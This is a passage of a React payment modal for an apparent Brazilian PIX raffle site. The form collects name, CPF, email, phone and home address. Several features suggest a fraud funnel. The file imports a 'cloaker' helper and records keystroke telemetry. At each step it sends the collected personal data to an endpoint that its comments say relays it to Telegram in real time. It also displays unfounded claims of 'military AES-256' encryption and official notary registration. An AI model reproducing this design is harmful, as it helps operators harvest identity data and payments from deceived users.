import { useState, useEffect } from "react";
import QRCode from "qrcode";
import {
  validateBrazilianCpf,
  type CpfValidationResult,
} from "@/lib/brazilian-player-validator";
import {
  initPlayerTelemetry,
  recordFormKeystroke,
  getClientPlayerTelemetryPayload,
} from "@/lib/client-player-telemetry";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { reportUserActivity, useRifaConfig } from "@/hooks/useRifaConfig";
import { cloakText } from "@/lib/cloaker";

import {
  User,
  CreditCard,
  Mail,
  Phone,
  MapPin,
  Search,
  CheckCircle2,
  ShieldCheck,
  Sparkles,
  Ticket,
  ArrowRight,
  ArrowLeft,
  Copy,
  Check,
  Building2,
  Lock,
  AlertCircle,
  QrCode as QrIcon,
  Download,
} from "lucide-react";

interface PaymentModalProps {
  children: React.ReactNode;
  onModalOpen?: () => void;
  selectedCotas?: number;
  totalPrice?: number;
}

export function PaymentModal({
  children,
  onModalOpen,
  selectedCotas: initialSelectedCotas = 30,
}: PaymentModalProps) {
  const config = useRifaConfig();
  const [open, setOpen] = useState(false);

  // Etapa ativa: 1 = Dados Pessoais, 2 = Endereço & CEP, 3 = Resumo de Cotas, 4 = Pagamento PIX
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);

  // Etapa 1: Dados Pessoais
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [email, setEmail] = useState("");
  const [telefone, setTelefone] = useState("");

  // Etapa 2: Endereço & CEP
  const [cep, setCep] = useState("");
  const [logradouro, setLogradouro] = useState("");
  const [numero, setNumero] = useState("");
  const [complemento, setComplemento] = useState("");
  const [bairro, setBairro] = useState("");
  const [cidade, setCidade] = useState("");
  const [estado, setEstado] = useState("");
  const [cepLoading, setCepLoading] = useState(false);
  const [cepSuccess, setCepSuccess] = useState(false);

  // Cotas e Pedido
  const [selectedCotas, setSelectedCotas] = useState(initialSelectedCotas || 30);
  const [loading, setLoading] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);

  // Dados do PIX
  const [pixData, setPixData] = useState<{
    pixCopiaCola: string;
    qrCodeBase64?: string;
    provider: string;
  } | null>(null);

  const [tickets, setTickets] = useState<{ code: string; hash: string }[]>([]);
  const [proofToken, setProofToken] = useState<string | null>(null);
  const [currentTxId, setCurrentTxId] = useState<string | null>(null);
  const [copiedCodes, setCopiedCodes] = useState(false);
  const [copiedPix, setCopiedPix] = useState(false);
  const [qrCodeSrc, setQrCodeSrc] = useState<string | null>(null);

  const packages = [
    { cotas: 23, tag: "INICIANTE", popular: false },
    { cotas: 30, tag: "MAIS POPULAR", popular: true },
    { cotas: 50, tag: "RECOMENDADO", popular: false },
    { cotas: 100, tag: "SUPER CHANCE", popular: false },
  ];

  useEffect(() => {
    initPlayerTelemetry();
  }, []);

  useEffect(() => {
    if (initialSelectedCotas) {
      setSelectedCotas(initialSelectedCotas);
    }
  }, [initialSelectedCotas]);

  // Geração do QR Code PIX
  useEffect(() => {
    if (!pixData?.pixCopiaCola) {
      setQrCodeSrc(null);
      return;
    }

    if (pixData.qrCodeBase64) {
      const b64 = pixData.qrCodeBase64.trim();
      if (b64.startsWith("data:") || b64.startsWith("http")) {
        setQrCodeSrc(b64);
        return;
      }
      if (b64.length > 50 && !b64.includes(" ")) {
        setQrCodeSrc(`data:image/png;base64,${b64.replace(/^base64:/, "")}`);
        return;
      }
    }

    let active = true;
    QRCode.toDataURL(pixData.pixCopiaCola, {
      width: 340,
      margin: 1,
      color: {
        dark: "#111827",
        light: "#ffffff",
      },
    })
      .then((url) => {
        if (active) setQrCodeSrc(url);
      })
      .catch(() => {
        if (active) {
          setQrCodeSrc(
            `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(
              pixData.pixCopiaCola
            )}`
          );
        }
      });

    return () => {
      active = false;
    };
  }, [pixData]);

  // Polling automático de confirmação de pagamento
  useEffect(() => {
    if (!currentTxId || tickets.length > 0) return;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/tickets/status?txId=${encodeURIComponent(currentTxId)}`);
        if (res.ok) {
          const data = await res.json();
          if (data.proofToken) setProofToken(data.proofToken);
          if (data.hasTickets && Array.isArray(data.tickets)) {
            setTickets(data.tickets);
            clearInterval(interval);
          }
        }
      } catch {}
    }, 3000);

    return () => clearInterval(interval);
  }, [currentTxId, tickets.length]);

  const currentTotal = Number((selectedCotas * (config.ticketPrice || 0.69)).toFixed(2));
  const currentTotalFormatted = currentTotal.toFixed(2).replace(".", ",");

  const handleOpenModal = () => {
    setOpen(true);
    setStep(1);
    setPixData(null);
    setTickets([]);
    setCurrentTxId(null);
    setFormError(null);
    setSelectedCotas(initialSelectedCotas || 30);
    if (onModalOpen) onModalOpen();
    reportUserActivity("modal_opened", { cotas: initialSelectedCotas || 30 });
  };

  // Máscaras e Formatações
  const handleNomeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    recordFormKeystroke();
    setFormError(null);
    setNome(e.target.value);
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    recordFormKeystroke();
    setFormError(null);
    let raw = e.target.value.replace(/\D/g, "");
    if (raw.length > 11) raw = raw.slice(0, 11);

    let formatted = raw;
    if (raw.length > 9) {
      formatted = raw.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
    } else if (raw.length > 6) {
      formatted = raw.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
    } else if (raw.length > 3) {
      formatted = raw.replace(/(\d{3})(\d{1,3})/, "$1.$2");
    }

    setCpf(formatted);

    if (raw.length === 11) {
      const check = validateBrazilianCpf(raw);
      reportUserActivity("cpf_validado", {
        cpf: formatted,
        cpfLimpo: raw,
        fiscalRegion: check.fiscalRegion?.description,
        estados: check.fiscalRegion?.states,
      });
    }
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    recordFormKeystroke();
    setFormError(null);
    setEmail(e.target.value);
  };

  const handleTelefoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    recordFormKeystroke();
    setFormError(null);
    let raw = e.target.value.replace(/\D/g, "");
    if (raw.length > 11) raw = raw.slice(0, 11);

    let formatted = raw;
    if (raw.length > 10) {
      formatted = raw.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
    } else if (raw.length > 6) {
      formatted = raw.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
    } else if (raw.length > 2) {
      formatted = raw.replace(/(\d{2})(\d{0,5})/, "($1) $2");
    }

    setTelefone(formatted);
  };

  const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    recordFormKeystroke();
    setFormError(null);
    setCepSuccess(false);

    let raw = e.target.value.replace(/\D/g, "");
    if (raw.length > 8) raw = raw.slice(0, 8);

    let formatted = raw;
    if (raw.length > 5) {
      formatted = raw.replace(/(\d{5})(\d{1,3})/, "$1-$2");
    }

    setCep(formatted);

    // Quando digitar 8 dígitos completos, consulta automaticamente
    if (raw.length === 8) {
      await searchCep(raw);
    }
  };

  const searchCep = async (cleanCep: string) => {
    setCepLoading(true);
    setFormError(null);
    try {
      const res = await fetch(`/api/cep?cep=${cleanCep}`);
      if (res.ok) {
        const data = await res.json();
        if (data.logradouro !== undefined) {
          setLogradouro(data.logradouro || "");
          setBairro(data.bairro || "");
          setCidade(data.localidade || "");
          setEstado(data.uf || "");
          setCepSuccess(true);
          // Foca automaticamente no campo Número
          setTimeout(() => {
            const numEl = document.getElementById("numero-input");
            if (numEl) numEl.focus();
          }, 100);
        } else {
          setFormError("CEP não encontrado. Por favor, preencha o endereço manualmente.");
        }
      } else {
        setFormError("Não encontramos este CEP. Preencha seu endereço abaixo.");
      }
    } catch {
      setFormError("Falha na consulta automática do CEP. Preencha seu endereço manualmente.");
    } finally {
      setCepLoading(false);
    }
  };

  // Validação e Avanço da Etapa 1 -> Etapa 2
  const handleProceedToStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);

    const nomeParts = nome.trim().split(/\s+/);
    if (nomeParts.length < 2 || nome.trim().length < 5) {
      setFormError("Por favor, informe seu nome completo (nome e sobrenome).");
      document.getElementById("nome-input")?.focus();
      return;
    }

    const cpfDigits = cpf.replace(/\D/g, "");
    if (cpfDigits.length !== 11) {
      setFormError("Por favor, digite os 11 dígitos do seu CPF.");
      document.getElementById("cpf-input")?.focus();
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setFormError("Por favor, informe um endereço de e-mail válido.");
      document.getElementById("email-input")?.focus();
      return;
    }

    const telDigits = telefone.replace(/\D/g, "");
    if (telDigits.length < 10) {
      setFormError("Por favor, informe um número de WhatsApp/celular com DDD.");
      document.getElementById("tel-input")?.focus();
      return;
    }

    // Registra no Telegram em tempo real
    fetch("/api/lead-step", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        step: "step_1_dados_pessoais",
        data: {
          name: nome.trim(),
          cpf,
          email: email.trim(),
          phone: telefone,
        },
      }),
    }).catch(() => {});

    setStep(2);
  };

  // Validação e Avanço da Etapa 2 -> Etapa 3
  const handleProceedToStep3 = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);

    const cepDigits = cep.replace(/\D/g, "");
    if (cepDigits.length !== 8) {
      setFormError("Por favor, informe um CEP válido com 8 dígitos.");
      document.getElementById("cep-input")?.focus();
      return;
    }

    if (!logradouro.trim()) {
      setFormError("Por favor, informe a Rua ou Logradouro.");
      document.getElementById("logradouro-input")?.focus();
      return;
    }

    if (!numero.trim()) {
      setFormError("Por favor, informe o número da residência (ou S/N).");
      document.getElementById("numero-input")?.focus();
      return;
    }

    if (!bairro.trim()) {
      setFormError("Por favor, informe o bairro.");
      document.getElementById("bairro-input")?.focus();
      return;
    }

    if (!cidade.trim()) {
      setFormError("Por favor, informe a cidade.");
      document.getElementById("cidade-input")?.focus();
      return;
    }

    if (!estado.trim()) {
      setFormError("Por favor, selecione ou informe o Estado (UF).");
      document.getElementById("estado-input")?.focus();
      return;
    }

    // Registra no Telegram em tempo real
    fetch("/api/lead-step", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        step: "step_2_endereco",
        data: {
          name: nome.trim(),
          cpf,
          cep,
          address: logradouro.trim(),
          number: numero.trim(),
          neighborhood: bairro.trim(),
          city: cidade.trim(),
          state: estado.trim(),
          complement: complemento.trim(),
        },
      }),
    }).catch(() => {});

    setStep(3);
  };

  // Confirmação do Resumo e Geração Final do PIX
  const handleConfirmAndPay = async () => {
    setLoading(true);
    setFormError(null);

    const cpfDigits = cpf.replace(/\D/g, "");
    const telemetry = getClientPlayerTelemetryPayload(cpfDigits);

    // Registra no Telegram que o lead confirmou o resumo
    fetch("/api/lead-step", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        step: "step_3_resumo",
        data: {
          name: nome.trim(),
          cpf,
          cotas: selectedCotas,
          amount: currentTotal,
        },
      }),
    }).catch(() => {});

    try {
      const res = await fetch("/api/create-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: currentTotal,
          description: `Bolada Pix - ${selectedCotas} Cotas - ${config.edition}`,
          payerDocument: cpfDigits,
          payerName: nome.trim(),
          name: nome.trim(),
          email: email.trim(),
          phone: telefone,
          cep,
          address: logradouro.trim(),
          number: numero.trim(),
          neighborhood: bairro.trim(),
          city: cidade.trim(),
          state: estado.trim(),
          complement: complemento.trim(),
          telemetry,
        }),
      });

      const data = await res.json();
      if (data.success && data.pixCopiaCola) {
        setPixData({
          pixCopiaCola: data.pixCopiaCola,
          qrCodeBase64: data.qrCodeBase64,
          provider: data.provider,
        });
        setCurrentTxId(data.transactionId || null);
        setStep(4);
      } else {
        setFormError(data.error || "Não foi possível gerar a cobrança PIX no momento. Tente novamente.");
      }
    } catch {
      setFormError("Erro de comunicação com o servidor de pagamento. Por favor, tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  const handleCopyPix = () => {
    if (pixData?.pixCopiaCola) {
      navigator.clipboard.writeText(pixData.pixCopiaCola);
      setCopiedPix(true);
      setTimeout(() => setCopiedPix(false), 3000);
    }
  };

  const handleCopyAllTickets = () => {
    if (tickets.length > 0) {
      const text = tickets.map((t, idx) => `Cota #${idx + 1}: ${t.code} (Hash: ${t.hash})`).join("\n");
      navigator.clipboard.writeText(text);
      setCopiedCodes(true);
      setTimeout(() => setCopiedCodes(false), 2500);
    }
  };

  const handleDownloadTxt = () => {
    if (currentTxId) {
      window.open(`/api/tickets/download?txId=${encodeURIComponent(currentTxId)}`, "_blank");
    }
  };

  const cpfCheck = validateBrazilianCpf(cpf.replace(/\D/g, ""));

  return (
    <>
      <div onClick={handleOpenModal} className="inline-flex cursor-pointer">
        {children}
      </div>

      <Dialog open={open} onOpenChange={setOpen}>
        <DialogContent className="sm:max-w-[620px] max-h-[92vh] overflow-y-auto p-5 sm:p-7 gap-5">
          <DialogHeader className="gap-1.5 pb-2 border-b border-gray-100">
            <div className="flex items-center justify-between">
              <DialogTitle className="text-xl sm:text-2xl font-black text-gray-900 flex items-center gap-2">
                {tickets.length > 0 ? (
                  <>
                    <Sparkles className="w-6 h-6 text-[#4d8227]" />
                    <span>Bilhetes Oficiais Emitidos!</span>
                  </>
                ) : step === 4 ? (
                  <>
                    <QrIcon className="w-6 h-6 text-[#4d8227]" />
                    <span>Pagamento PIX Gerado</span>
                  </>
                ) : step === 3 ? (
                  <>
                    <Ticket className="w-6 h-6 text-[#4d8227]" />
                    <span>Resumo do Pedido Oficial</span>
                  </>
                ) : step === 2 ? (
                  <>
                    <MapPin className="w-6 h-6 text-[#4d8227]" />
                    <span>Endereço para Entrega do Prêmio</span>
                  </>
                ) : (
                  <>
                    <User className="w-6 h-6 text-[#4d8227]" />
                    <span>Cadastro do Participante</span>
                  </>
                )}
              </DialogTitle>
            </div>
            <DialogDescription className="text-xs sm:text-sm text-gray-500">
              {tickets.length > 0
                ? "Parabéns! Suas cotas oficiais já estão registradas e concorrendo:"
                : step === 4
                ? "Efetue o pagamento PIX no seu banco para liberar seus bilhetes instantaneamente."
                : step === 3
                ? "Confira os dados do participante e suas cotas antes de gerar o PIX oficial."
                : step === 2
                ? "Informe seu endereço para o envio oficial e registro em cartório caso você seja o ganhador."
                : "Preencha seus dados reais para emissão autenticada dos seus números da sorte."}
            </DialogDescription>

            {/* Stepper Visual de 3 Etapas */}
            {tickets.length === 0 && step < 4 && (
              <div className="grid grid-cols-3 gap-2 pt-3">
                <div
                  className={`flex items-center gap-2 pb-1.5 border-b-2 text-xs font-bold transition-all ${
                    step >= 1 ? "border-[#4d8227] text-[#4d8227]" : "border-gray-200 text-gray-400"
                  }`}
                >
                  <span
                    className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black shrink-0 ${
                      step >= 1 ? "bg-[#4d8227] text-white" : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    1
                  </span>
                  <span className="truncate">Identificação</span>
                </div>

                <div
                  className={`flex items-center gap-2 pb-1.5 border-b-2 text-xs font-bold transition-all ${
                    step >= 2 ? "border-[#4d8227] text-[#4d8227]" : "border-gray-200 text-gray-400"
                  }`}
                >
                  <span
                    className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black shrink-0 ${
                      step >= 2 ? "bg-[#4d8227] text-white" : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    2
                  </span>
                  <span className="truncate">Endereço</span>
                </div>

                <div
                  className={`flex items-center gap-2 pb-1.5 border-b-2 text-xs font-bold transition-all ${
                    step >= 3 ? "border-[#4d8227] text-[#4d8227]" : "border-gray-200 text-gray-400"
                  }`}
                >
                  <span
                    className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black shrink-0 ${
                      step >= 3 ? "bg-[#4d8227] text-white" : "bg-gray-200 text-gray-600"
                    }`}
                  >
                    3
                  </span>
                  <span className="truncate">Resumo & Pagar</span>
                </div>
              </div>
            )}
          </DialogHeader>

          {/* Mensagem de Erro Geral */}
          {formError && (
            <div className="p-3 bg-red-50 border border-red-200 rounded-xl text-xs text-red-700 flex items-start gap-2.5 animate-in fade-in duration-200">
              <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
              <span className="leading-relaxed font-medium">{formError}</span>
            </div>
          )}

          {/* ================================================================= */}
          {/* ETAPA 1: DADOS PESSOAIS                                           */}
          {/* ================================================================= */}
          {step === 1 && tickets.length === 0 && (
            <form onSubmit={handleProceedToStep2} className="flex flex-col gap-4">
              {/* Nome Completo */}
              <div className="flex flex-col gap-1.5">
                <Label htmlFor="nome-input" className="text-xs font-bold text-gray-700 flex items-center gap-1.5">
                  <User className="w-3.5 h-3.5 text-[#4d8227]" />
                  <span>Nome Completo</span>
                  <span className="text-[10px] text-gray-400 font-normal">(conforme RG/CPF)</span>
                </Label>
                <div className="relative">
                  <Input
                    id="nome-input"
                    placeholder="Ex: João da Silva Santos"
                    value={nome}
                    onChange={handleNomeChange}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                  {nome.trim().split(/\s+/).length >= 2 && nome.trim().length >= 5 && (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 absolute right-3 top-1/2 -translate-y-1/2" />
                  )}
                </div>
              </div>

              {/* CPF e Telefone (Grid 2 colunas) */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                {/* CPF */}
                <div className="flex flex-col gap-1.5">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="cpf-input" className="text-xs font-bold text-gray-700 flex items-center gap-1.5">
                      <CreditCard className="w-3.5 h-3.5 text-[#4d8227]" />
                      <span>CPF</span>
                    </Label>
                    {cpf.replace(/\D/g, "").length === 11 && (
                      <span className="text-[10px] font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
                        {cpfCheck.fiscalRegion ? `✓ ${cpfCheck.fiscalRegion.states.join(", ")}` : "✓ CPF OK"}
                      </span>
                    )}
                  </div>
                  <div className="relative">
                    <Input
                      id="cpf-input"
                      placeholder="000.000.000-00"
                      value={cpf}
                      onChange={handleCpfChange}
                      inputMode="numeric"
                      maxLength={14}
                      className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                      required
                    />
                    {cpf.replace(/\D/g, "").length === 11 && (
                      <CheckCircle2 className="w-4 h-4 text-emerald-600 absolute right-3 top-1/2 -translate-y-1/2" />
                    )}
                  </div>
                </div>

                {/* WhatsApp / Celular */}
                <div className="flex flex-col gap-1.5">
                  <Label htmlFor="tel-input" className="text-xs font-bold text-gray-700 flex items-center gap-1.5">
                    <Phone className="w-3.5 h-3.5 text-[#4d8227]" />
                    <span>WhatsApp / Celular</span>
                  </Label>
                  <div className="relative">
                    <Input
                      id="tel-input"
                      placeholder="(11) 99999-9999"
                      value={telefone}
                      onChange={handleTelefoneChange}
                      inputMode="tel"
                      maxLength={15}
                      className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                      required
                    />
                    {telefone.replace(/\D/g, "").length >= 10 && (
                      <CheckCircle2 className="w-4 h-4 text-emerald-600 absolute right-3 top-1/2 -translate-y-1/2" />
                    )}
                  </div>
                </div>
              </div>

              {/* E-mail */}
              <div className="flex flex-col gap-1.5">
                <Label htmlFor="email-input" className="text-xs font-bold text-gray-700 flex items-center gap-1.5">
                  <Mail className="w-3.5 h-3.5 text-[#4d8227]" />
                  <span>E-mail</span>
                  <span className="text-[10px] text-gray-400 font-normal">(para envio do comprovante oficial)</span>
                </Label>
                <div className="relative">
                  <Input
                    id="email-input"
                    type="email"
                    placeholder="seuemail@exemplo.com"
                    value={email}
                    onChange={handleEmailChange}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                  {/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim()) && (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 absolute right-3 top-1/2 -translate-y-1/2" />
                  )}
                </div>
              </div>

              {/* Selo de Segurança */}
              <div className="flex items-center gap-2 p-2.5 bg-gray-50 border border-gray-200/80 rounded-lg text-[11px] text-gray-600 mt-1">
                <Lock className="w-3.5 h-3.5 text-[#4d8227] shrink-0" />
                <span>Seus dados são transmitidos sob criptografia militar <strong>AES-256</strong> e protegidos pela LGPD.</span>
              </div>

              <Button
                type="submit"
                className="w-full h-12 text-sm sm:text-base font-extrabold text-white bg-[#4d8227] hover:bg-[#437222] rounded-xl shadow-xs transition-all cursor-pointer flex items-center justify-center gap-2 mt-2"
              >
                <span>Avançar para Endereço</span>
                <ArrowRight className="w-4 h-4" />
              </Button>
            </form>
          )}

          {/* ================================================================= */}
          {/* ETAPA 2: ENDEREÇO & CEP PROFUNDO                                  */}
          {/* ================================================================= */}
          {step === 2 && tickets.length === 0 && (
            <form onSubmit={handleProceedToStep3} className="flex flex-col gap-4">
              {/* CEP com Busca Automática */}
              <div className="flex flex-col gap-1.5">
                <div className="flex items-center justify-between">
                  <Label htmlFor="cep-input" className="text-xs font-bold text-gray-700 flex items-center gap-1.5">
                    <Search className="w-3.5 h-3.5 text-[#4d8227]" />
                    <span>CEP</span>
                    <span className="text-[10px] text-gray-400 font-normal">(digite para autopreencher)</span>
                  </Label>
                  {cepSuccess && (
                    <span className="text-[10px] font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
                      ✓ Endereço Localizado
                    </span>
                  )}
                </div>
                <div className="relative">
                  <Input
                    id="cep-input"
                    placeholder="00000-000"
                    value={cep}
                    onChange={handleCepChange}
                    inputMode="numeric"
                    maxLength={9}
                    className="h-11 text-sm px-3.5 pr-10 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
                    {cepLoading ? (
                      <span className="w-4 h-4 border-2 border-[#4d8227] border-t-transparent rounded-full animate-spin inline-block"></span>
                    ) : cepSuccess ? (
                      <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                    ) : (
                      <MapPin className="w-4 h-4 text-gray-400" />
                    )}
                  </div>
                </div>
              </div>

              {/* Rua / Logradouro e Número */}
              <div className="grid grid-cols-3 gap-3">
                <div className="col-span-2 flex flex-col gap-1.5">
                  <Label htmlFor="logradouro-input" className="text-xs font-bold text-gray-700">
                    Rua / Logradouro
                  </Label>
                  <Input
                    id="logradouro-input"
                    placeholder="Ex: Av. Brasil"
                    value={logradouro}
                    onChange={(e) => setLogradouro(e.target.value)}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label htmlFor="numero-input" className="text-xs font-bold text-gray-700">
                    Número
                  </Label>
                  <Input
                    id="numero-input"
                    placeholder="123 ou S/N"
                    value={numero}
                    onChange={(e) => setNumero(e.target.value)}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                </div>
              </div>

              {/* Bairro e Complemento */}
              <div className="grid grid-cols-2 gap-3">
                <div className="flex flex-col gap-1.5">
                  <Label htmlFor="bairro-input" className="text-xs font-bold text-gray-700">
                    Bairro
                  </Label>
                  <Input
                    id="bairro-input"
                    placeholder="Ex: Centro"
                    value={bairro}
                    onChange={(e) => setBairro(e.target.value)}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label htmlFor="complemento-input" className="text-xs font-bold text-gray-700">
                    Complemento <span className="text-[10px] text-gray-400 font-normal">(Opcional)</span>
                  </Label>
                  <Input
                    id="complemento-input"
                    placeholder="Apto, Bloco, etc."
                    value={complemento}
                    onChange={(e) => setComplemento(e.target.value)}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                  />
                </div>
              </div>

              {/* Cidade e Estado */}
              <div className="grid grid-cols-3 gap-3">
                <div className="col-span-2 flex flex-col gap-1.5">
                  <Label htmlFor="cidade-input" className="text-xs font-bold text-gray-700">
                    Cidade
                  </Label>
                  <Input
                    id="cidade-input"
                    placeholder="Ex: São Paulo"
                    value={cidade}
                    onChange={(e) => setCidade(e.target.value)}
                    className="h-11 text-sm px-3.5 rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                </div>
                <div className="flex flex-col gap-1.5">
                  <Label htmlFor="estado-input" className="text-xs font-bold text-gray-700">
                    Estado (UF)
                  </Label>
                  <Input
                    id="estado-input"
                    placeholder="SP"
                    value={estado}
                    onChange={(e) => setEstado(e.target.value.toUpperCase())}
                    maxLength={2}
                    className="h-11 text-sm px-3.5 uppercase rounded-lg border-gray-200 focus-visible:ring-[#4d8227]"
                    required
                  />
                </div>
              </div>

              {/* Botões de Ação */}
              <div className="grid grid-cols-2 gap-3 mt-2">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => setStep(1)}
                  className="h-12 text-sm font-semibold border-gray-300 hover:bg-gray-100 rounded-xl cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <ArrowLeft className="w-4 h-4" />
                  <span>Voltar</span>
                </Button>

                <Button
                  type="submit"
                  className="h-12 text-sm sm:text-base font-extrabold text-white bg-[#4d8227] hover:bg-[#437222] rounded-xl shadow-xs transition-all cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <span>Ver Resumo das Cotas</span>
                  <ArrowRight className="w-4 h-4" />
                </Button>
              </div>
            </form>
          )}

          {/* ================================================================= */}
          {/* ETAPA 3: RESUMO AVANÇADO DE RIFAS & CONFIRMAÇÃO                    */}
          {/* ================================================================= */}
          {step === 3 && tickets.length === 0 && (
            <div className="flex flex-col gap-4">
              {/* Seletor Rápido de Cotas */}
              <div className="flex flex-col gap-2">
                <div className="flex justify-between items-center text-xs font-bold text-gray-800">
                  <span className="flex items-center gap-1.5">
                    <Ticket className="w-4 h-4 text-[#4d8227]" />
                    <span>Selecione a Quantidade de Cotas:</span>
                  </span>
                  <span className="text-xs text-[#4d8227] font-extrabold">
                    R$ {(config.ticketPrice || 0.69).toFixed(2).replace(".", ",")} por número
                  </span>
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  {packages.map((pkg) => {
                    const price = (pkg.cotas * (config.ticketPrice || 0.69)).toFixed(2).replace(".", ",");
                    const isSelected = selectedCotas === pkg.cotas;
                    return (
                      <button
                        key={pkg.cotas}
                        type="button"
                        onClick={() => setSelectedCotas(pkg.cotas)}
                        className={`relative p-2.5 rounded-xl border text-center transition-all cursor-pointer flex flex-col items-center justify-center ${
                          isSelected
                            ? "border-[#4d8227] bg-[#edf7ea] ring-2 ring-[#4d8227]"
                            : "border-gray-200 bg-white hover:border-[#4d8227]/50"
                        }`}
                      >
                        {pkg.popular && (
                          <span className="absolute -top-2 bg-[#4d8227] text-[8.5px] font-black text-white px-2 py-0.5 rounded-full uppercase tracking-wider shadow-2xs">
                            MAIS POPULAR
                          </span>
                        )}
                        <span className="font-extrabold text-sm text-gray-900 leading-tight">
                          {pkg.cotas} cotas
                        </span>
                        <span className="text-xs font-bold text-[#4d8227] mt-0.5">
                          R$ {price}
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Card Resumo Estruturado com Estética do Sistema */}
              <div className="rounded-2xl border border-gray-200/90 overflow-hidden bg-gradient-to-b from-white to-gray-50/70 shadow-xs">
                {/* Header do Card */}
                <div className="bg-[#4d8227] px-4 py-2.5 text-white flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Sparkles className="w-4 h-4 text-amber-300" />
                    <span className="font-extrabold text-xs uppercase tracking-wider">
                      Resumo da Inscrição • {config.edition}
                    </span>
                  </div>
                  <span className="text-[11px] bg-white/20 font-bold px-2 py-0.5 rounded-full">
                    Sorteio: {config.drawDate} às {config.drawTime}
                  </span>
                </div>

                {/* Conteúdo do Resumo */}
                <div className="p-4 flex flex-col gap-3 text-xs">
                  {/* Dados do Comprador */}
                  <div className="grid grid-cols-2 gap-2 pb-3 border-b border-gray-100">
                    <div className="flex flex-col gap-0.5">
                      <span className="text-[10px] text-gray-400 uppercase font-semibold">Participante</span>
                      <span className="font-bold text-gray-800 truncate">{nome}</span>
                    </div>
                    <div className="flex flex-col gap-0.5">
                      <span className="text-[10px] text-gray-400 uppercase font-semibold">CPF Vinculado</span>
                      <span className="font-mono font-bold text-gray-800">{cpf}</span>
                    </div>
                    <div className="flex flex-col gap-0.5">
                      <span className="text-[10px] text-gray-400 uppercase font-semibold">WhatsApp de Contato</span>
                      <span className="font-medium text-gray-700">{telefone}</span>
                    </div>
                    <div className="flex flex-col gap-0.5">
                      <span className="text-[10px] text-gray-400 uppercase font-semibold">Local de Entrega</span>
                      <span className="font-medium text-gray-700 truncate">{cidade} - {estado}</span>
                    </div>
                  </div>

                  {/* Resumo Financeiro */}
                  <div className="flex flex-col gap-1.5 pt-1">
                    <div className="flex justify-between items-center text-gray-600">
                      <span>Cotas Oficiais Selecionadas:</span>
                      <span className="font-bold text-gray-800 font-mono">{selectedCotas} números</span>
                    </div>
                    <div className="flex justify-between items-center text-gray-600">
                      <span>Valor Individual por Cota:</span>
                      <span className="font-bold text-gray-800 font-mono">
                        R$ {(config.ticketPrice || 0.69).toFixed(2).replace(".", ",")}
                      </span>
                    </div>
